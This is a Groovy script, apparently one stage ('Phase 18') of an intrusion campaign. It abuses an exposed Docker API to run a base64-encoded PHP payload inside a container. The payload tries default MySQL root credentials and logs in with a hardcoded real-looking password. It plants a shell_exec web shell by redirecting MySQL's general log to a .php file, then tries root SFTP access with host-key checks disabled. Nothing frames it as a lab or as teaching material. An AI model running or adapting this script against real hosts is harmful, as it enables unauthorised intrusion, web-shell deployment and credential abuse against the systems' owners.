// Phase 18: MySQL root:password test + general_log RCE
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

echo "===== [1] MySQL root:password on T1Pagos =====\\n";
$m = @new mysqli("172.27.141.4", "root", "password", "", 3306);
if (!$m->connect_error) {
    echo "*** ROOT_MYSQL_OK *** root:password @ 172.27.141.4:3306\\n";
    $r = $m->query("SELECT CURRENT_USER() cu, @@hostname hn");
    $row = $r->fetch_assoc();
    echo "CU=".$row["cu"]." HN=".$row["hn"]."\\n";
    $r = $m->query("SHOW GRANTS FOR CURRENT_USER()");
    while ($row = $r->fetch_row()) echo "  ".$row[0]."\\n";
    $m->close();
} else {
    echo "ROOT_FAIL|".$m->connect_error."\\n";
}

echo "\\n===== [2] GENERAL LOG RCE (T1Pagos adaxxidb) =====\\n";
$m = new mysqli("172.27.141.4", "adaxxidb", "JTQ6PrkecY3y1kVN", "", 3306);
if ($m->connect_error) { die("CONNECT_FAIL\\n"); }

// Check current log state
$r = $m->query("SELECT @@general_log gl, @@general_log_file glf, @@log_output lo");
$row = $r->fetch_assoc();
echo "BEFORE: gl=".$row["gl"]." file=".$row["glf"]." output=".$row["lo"]."\\n";

// Set log file to /tmp and inject PHP
$m->query("SET GLOBAL general_log = 0");
$m->query("SET GLOBAL general_log_file = '/tmp/rce_test.php'");
$m->query("SET GLOBAL general_log = 1");

// Inject PHP payload via a SELECT
$m->query("SELECT '<?php echo shell_exec(\\$_GET[chr(99)]); ?>'");
$m->query("SET GLOBAL general_log = 0");

// Restore original
$m->query("SET GLOBAL general_log_file = '/var/lib/mysql/CSDEV01-2.log'");

// Verify file written
$r = $m->query("SELECT LOAD_FILE('/tmp/rce_test.php') c");
$row = $r->fetch_assoc();
if ($row["c"] && strpos($row["c"], "shell_exec") !== false) {
    echo "*** GENERAL_LOG_RCE_FILE_WRITTEN *** (".strlen($row["c"])." bytes)\\n";
    echo "PHP payload confirmed in /tmp/rce_test.php\\n";
    echo "Content (first 500):\\n".substr($row["c"], 0, 500)."\\n";
} else {
    echo "FILE_CHECK_FAILED\\n";
    if ($row["c"]) echo "Content: ".substr($row["c"],0,200)."\\n";
}

echo "\\n===== [3] CURL SFTP with HOME=/tmp =====\\n";
// Write known_hosts manually
$hosts_output = shell_exec("HOME=/tmp mkdir -p /tmp/.ssh 2>&1 && echo done");
echo "mkdir: $hosts_output\\n";

// Try getting host keys and adding them
$scan = shell_exec("HOME=/tmp ssh-keyscan -t rsa 172.27.141.24 2>/dev/null");
if ($scan) {
    file_put_contents("/tmp/.ssh/known_hosts", $scan);
    echo "Host key written\\n";
    
    // Now try SFTP
    $result = shell_exec("HOME=/tmp curl -sS --connect-timeout 5 -u 'root:password' sftp://172.27.141.24/ 2>&1");
    echo "SFTP_RESULT: ".substr($result, 0, 300)."\\n";
} else {
    echo "ssh-keyscan not available\\n";
    
    // Alternative: disable host key check via CURLOPT
    // In PHP, we can use curl functions with CURLOPT_SSH_HOST_PUBLIC_KEY_MD5
    $ch = curl_init("sftp://root:password@172.27.141.24/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    // Try setting SSH options
    if (defined("CURLOPT_SSH_HOST_PUBLIC_KEY_MD5")) {
        curl_setopt($ch, CURLOPT_SSH_HOST_PUBLIC_KEY_MD5, "");
    }
    // Use CURLOPT_SSH_KNOWNHOSTS with a non-existent file to disable check
    if (defined("CURLOPT_SSH_KNOWNHOSTS")) {
        curl_setopt($ch, CURLOPT_SSH_KNOWNHOSTS, "/dev/null");
    }
    $result = curl_exec($ch);
    $err = curl_error($ch);
    $code = curl_errno($ch);
    curl_close($ch);
    echo "PHP_CURL_SFTP: code=$code err=$err result=".substr($result??"",0,200)."\\n";
}

echo "\\nPHASE18_DONE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p18.php && php /tmp/_p18.php 2>&1; rm -f /tmp/_p18.php"
println execIn(cmd)
